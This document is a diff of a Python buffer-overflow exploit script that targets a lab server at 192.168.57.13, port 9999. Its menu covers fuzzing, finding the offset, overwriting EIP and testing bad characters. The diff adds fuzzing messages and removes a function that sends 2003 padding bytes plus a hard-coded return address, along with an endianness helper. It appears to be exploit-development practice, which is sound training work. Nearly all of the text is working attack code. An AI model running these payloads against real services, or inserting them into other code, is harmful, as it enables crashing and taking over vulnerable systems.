@@ -5,7 +5,7 @@ from time import sleep
 
 
 def border():
-    print("-" * 50)
+    print("-" * 100)
 
 
 def server_error():
@@ -18,6 +18,8 @@ def try_fuzzing(target_ip, target_port, cmd_attacking):
     buffer = "A" * 100
     while True:
         try:
+            print(f"Starting to fuzz target {target_ip} on port {target_port}")
+            print("You may need to CTRL+C the script once you noticed the server has crashed.")
             print(f'Trying buffer size of {str(len(buffer))} bytes')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, target_port))
@@ -27,7 +29,7 @@ def try_fuzzing(target_ip, target_port, cmd_attacking):
             sleep(1)
             buffer += "A" * 100
         except:
-            print(f"Fuzzing crashed at %s bytes {str(len(buffer))}")
+            print(f"Fuzzing crashed at {str(len(buffer))} bytes")
             border()
             sys.exit()
 
@@ -97,34 +99,6 @@ def try_bad_chars(target_ip, target_port, cmd_attacking):
         server_error()
 
 
-def convert_to_little_endian_format(address):
-    # Example for address 625011af == "\xaf\x11\x50\x62"
-    x_sting = "\\x"
-    little_endian = address[::-1]
-    little_endian = f"{x_sting}{little_endian[1]}{little_endian[0]}{x_sting}{little_endian[3]}{little_endian[2]}{x_sting}{little_endian[5]}{little_endian[4]}{x_sting}{little_endian[7]}{little_endian[6]}"
-    print(f"Little endian address: {little_endian}")
-    return str(little_endian)
-
-
-def try_right_modules(target_ip, target_port, cmd_attacking):
-    offset = 2003
-    address = "625011af"
-    # offset = int(input("Enter the exact offset value: "))
-    # address = str(input("Enter the EIP address of the module: "))
-    endian_address = "\xaf\x11\x50\x62"
-    shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
-
-    try:
-        print("Trying module. EIP should show the correct module name.")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, target_port))
-        payload = cmd_attacking + shellcode
-        s.send(payload)
-        s.close()
-    except:
-        server_error()
-
-
 def main():
     target_ip = "192.168.57.13"
     target_port = 9999
@@ -134,7 +108,7 @@ def main():
     # cmd_attacking = str(input('Enter cmd to attack: '))
 
     border()
-    print("Options: \n\n1. Fuzzing \n2. Offset \n3. Overwrite EIP \n4. Bad Chars \n5. Right Modules \n")
+    print("Options: \n\n1. Fuzzing \n2. Offset \n3. Overwrite EIP \n4. Bad Chars \n")
     option = int(input("Enter option: "))
     border()
 
@@ -146,8 +120,6 @@ def main():
         try_overwrite_eip(target_ip, target_port, cmd_attacking)
     elif option == 4:
         try_bad_chars(target_ip, target_port, cmd_attacking)
-    elif option == 5:
-        try_right_modules(target_ip, target_port, cmd_attacking)
 
 
 main()
